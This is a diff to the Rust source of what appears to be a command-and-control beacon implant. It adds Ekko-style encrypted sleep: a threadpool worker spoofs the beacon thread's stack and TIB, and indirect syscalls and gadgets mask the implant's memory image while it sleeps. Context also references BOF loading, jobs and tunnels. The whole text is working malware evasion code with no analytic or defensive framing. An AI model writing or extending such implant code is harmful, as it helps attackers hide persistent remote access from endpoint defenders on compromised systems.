@@ -103,6 +103,8 @@ pub struct Instance {
     pub upload: Option<crate::tasks::UploadState>,
     /// BOF runtime outputs waiting for the next POSTs (one BOF at a time).
     pub bof_pending: Option<crate::coff::BofPending>,
+    /// Threadpool sleep + TIB spoof state (port of sleep.c 160-560).
+    pub ekko: crate::runtime::ekko::EkkoState,
     /// Debug channel handle (0 = closed/absent; `config::DEBUG` builds).
     pub debug_handle: isize,
 }
@@ -350,6 +352,28 @@ unsafe fn bootstrap() -> Option<Instance> {
     crate::runtime::debug::log_handle(dbg, b"bs: heap ok\n");
     stage_gate(9);
 
+    // Threadpool sleep + TIB spoof (sleep.c 160-560): only armed when the
+    // encrypted mask exists — the worker's whole purpose is running its
+    // stub off-thread. A missing heap or CFG enforcement degrade to the
+    // direct-stub sleep.
+    let ekko = match (&sleep_mask, &heap) {
+        (Some(m), Some(h)) => crate::runtime::ekko::init(
+            ntdll,
+            kernel32,
+            &syscall_table,
+            heap_alloc as usize,
+            h.handle as isize,
+            m.img_base,
+            m.img_end,
+            dbg,
+        ),
+        _ => crate::runtime::ekko::EkkoState::off(
+            syscall_table.get_ctx_ssn,
+            syscall_table.set_ctx_ssn,
+        ),
+    };
+    crate::runtime::debug::log_handle(dbg, b"bs: ekko ok\n");
+
     let wh = winhttp::resolve(peb, kernel32);
     crate::runtime::debug::log_handle(dbg, b"bs: winhttp ok\n");
     let sysinfo = crate::runtime::sysinfo::collect(peb, dbg);
@@ -413,6 +437,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         tunnels_len: 0,
         upload: None,
         bof_pending: None,
+        ekko,
         // The handle opened at the very top of the bootstrap carries over.
         debug_handle: dbg,
     };
@@ -796,29 +821,37 @@ pub unsafe fn main() -> ! {
         let delay_ssn = instance.syscalls.delay_ssn;
         let seed = instance.rng.next_u64();
 
-        if instance.sleep_mask.is_some() {
-            // Encrypted sleep: the whole image goes through the keystream
-            // while the thread is inside NtDelayExecution. The per-cycle
-            // fields refresh first, then the stub runs alone.
+        // Encrypted sleep (SptSleepRun): other threads running beacon
+        // code (ps run/shell jobs, tunnels) would execute encrypted
+        // pages during the window — the native skips Ekko while any of
+        // them is active (SptAsyncActive) and so does this port.
+        if instance.sleep_mask.is_some() && async_active(&instance) {
+            crate::runtime::debug::log(&instance, b"sm: async\n");
+        } else if instance.sleep_mask.is_some() {
             crate::runtime::debug::log(&instance, b"sm: enter\n");
-        }
-        if let Some(ref mut mask) = instance.sleep_mask {
-            mask.seed = seed;
-            mask.gadget = gadget as usize;
-            mask.interval = interval;
-            crate::runtime::sleepmask::spt_sleepmask(core::ptr::from_ref(mask) as usize);
-            // A failed flip leaves its range untouched (the stub never
-            // writes to a page it could not make writable): the sleep was
-            // plain, say so instead of crashing.
-            let f1 = mask.flip1_status;
-            let f2 = mask.flip2_status;
-            if f1 != 0 || f2 != 0 {
-                crate::runtime::debug::log(&instance, b"sm: flip fail\n");
-            } else {
-                crate::runtime::debug::log(&instance, b"sm: flips ok\n");
+            // Raw pointer, not a place borrow: ekko_sleep mutates the
+            // instance (events, handles) while the mask block lives in
+            // it — the disjoint borrows cross at the raw level.
+            let mask_ptr = instance
+                .sleep_mask
+                .as_ref()
+                .map(|m| core::ptr::from_ref(m) as usize);
+            if let Some(mask_ptr) = mask_ptr {
+                let via_pool = ekko_sleep(&mut instance, mask_ptr, seed, interval, gadget);
+                let m = mask_ptr as *mut SleepMaskParams;
+                let f1 = unsafe { (*m).flip1_status };
+                let f2 = unsafe { (*m).flip2_status };
+                if f1 != 0 || f2 != 0 {
+                    crate::runtime::debug::log(&instance, b"sm: flip fail\n");
+                } else if via_pool {
+                    crate::runtime::debug::log(&instance, b"sm: pool ok\n");
+                } else {
+                    crate::runtime::debug::log(&instance, b"sm: flips ok\n");
+                }
             }
         } else {
-            // Plain indirect sleep (mask discovery failed).
+            // Plain indirect sleep (mask discovery failed or async work
+            // in flight).
             let mut interval = interval;
             let status = syscalls::indirect_syscall2(
                 delay_ssn,
@@ -830,4 +863,134 @@ pub unsafe fn main() -> ! {
             let _ = status;
         }
     }
+}
+
+/// Live asynchronous work (SptAsyncActive): any RUNNING/PENDING job
+/// (ps run, shell) or non-closing tunnel runs beacon code on a foreign
+/// thread — the image cannot be encrypted while one is in flight.
+fn async_active(instance: &Instance) -> bool {
+    let mut i = 0usize;
+    while i < instance.jobs_len {
+        if !instance.jobs[i].killed {
+            return true;
+        }
+        i += 1;
+    }
+    let mut i = 0usize;
+    while i < instance.tunnels_len {
+        if instance.tunnels[i].state != crate::tasks::TUNNEL_STATE_CLOSING {
+            return true;
+        }
+        i += 1;
+    }
+    false
+}
+
+/// Encrypted sleep through the threadpool worker (SptEkkoSleep): the
+/// beacon thread parks in WaitForSingleObject while the worker spoofs
+/// its parked stack and runs the stub. Returns false when the threadpool
+/// path is unavailable — the caller then runs the stub inline.
+///
+/// # Safety
+///
+/// The mask pointer must reference the instance-resident block for the
+/// whole call.
+unsafe fn ekko_sleep(
+    instance: &mut Instance,
+    mask: usize,
+    seed: u64,
+    interval: i64,
+    gadget: *const core::ffi::c_void,
+) -> bool {
+    use crate::runtime::ekko::{current_teb, ekko_worker_cb, EkkoCtx};
+    // Per-cycle refresh (the stub reads seed/gadget/interval through the
+    // parameter block only).
+    let m = mask as *mut SleepMaskParams;
+    (*m).seed = seed;
+    (*m).gadget = gadget as usize;
+    (*m).interval = interval;
+    if !instance.ekko.pool_ok {
+        crate::runtime::sleepmask::spt_sleepmask(mask);
+        return false;
+    }
+    let e = &instance.ekko;
+    let create_event: unsafe extern "system" fn(*mut u8, i32, i32, *mut u8) -> isize =
+        core::mem::transmute(e.create_event_a);
+    let duplicate: unsafe extern "system" fn(
+        isize,
+        isize,
+        isize,
+        *mut isize,
+        u32,
+        i32,
+        u32,
+    ) -> i32 = core::mem::transmute(e.duplicate_handle);
+    let tp_alloc: unsafe extern "system" fn(*mut usize, usize, *mut EkkoCtx, usize) -> i32 =
+        core::mem::transmute(e.tp_alloc_work);
+    let tp_post: unsafe extern "system" fn(usize) = core::mem::transmute(e.tp_post_work);
+    let tp_release: unsafe extern "system" fn(usize) = core::mem::transmute(e.tp_release_work);
+    let wait: unsafe extern "system" fn(isize, u32) -> u32 = core::mem::transmute(e.wait_single);
+    let close: unsafe extern "system" fn(isize) -> i32 = core::mem::transmute(e.close_handle);
+
+    let h_done = create_event(core::ptr::null_mut(), 1, 0, core::ptr::null_mut());
+    if h_done == 0 {
+        crate::runtime::sleepmask::spt_sleepmask(mask);
+        return false;
+    }
+    let cur_process: unsafe extern "system" fn() -> isize =
+        core::mem::transmute(e.get_current_process);
+    let cur_thread: unsafe extern "system" fn() -> isize =
+        core::mem::transmute(e.get_current_thread);
+    let mut h_beacon_thread: isize = 0;
+    let _ = duplicate(
+        cur_process(),
+        cur_thread(),
+        cur_process(),
+        &mut h_beacon_thread,
+        0x001F_FFFF,
+        0,
+        0,
+    );
+
+    let mut ctx = EkkoCtx {
+        mask: mask as *mut SleepMaskParams,
+        set_event: e.set_event,
+        h_done,
+        h_beacon_thread,
+        beacon_teb: current_teb(),
+        orig_stack_base: (current_teb() as *const u64).add(1).read_unaligned() as usize,
+        orig_stack_limit: (current_teb() as *const u64).add(2).read_unaligned() as usize,
+        spoof_stack_base: e.donor_stack_base,
+        spoof_stack_limit: e.donor_stack_limit,
+        suspend_ssn: e.suspend_ssn,
+        get_ctx_ssn: e.get_ctx_ssn,
+        set_ctx_ssn: e.set_ctx_ssn,
+        resume_ssn: e.resume_ssn,
+        gadget,
+        dbg: instance.debug_handle,
+    };
+
+    let mut tp_work: usize = 0;
+    let tp_st = tp_alloc(
+        &mut tp_work,
+        ekko_worker_cb as *const () as usize,
+        &mut ctx,
+        0,
+    );
+    if tp_st != 0 || tp_work == 0 {
+        crate::runtime::debug::log(instance, b"sm: noalloc\n");
+        close(h_done);
+        crate::runtime::sleepmask::spt_sleepmask(mask);
+        return false;
+    }
+    tp_post(tp_work);
+    // The worker owns the image through the whole encrypted window; the
+    // beacon thread wakes only after the restore + SetEvent.
+    wait(h_done, 0xFFFF_FFFF);
+    tp_release(tp_work);
+    close(h_done);
+    if h_beacon_thread != 0 {
+        close(h_beacon_thread);
+    }
+    true
 }
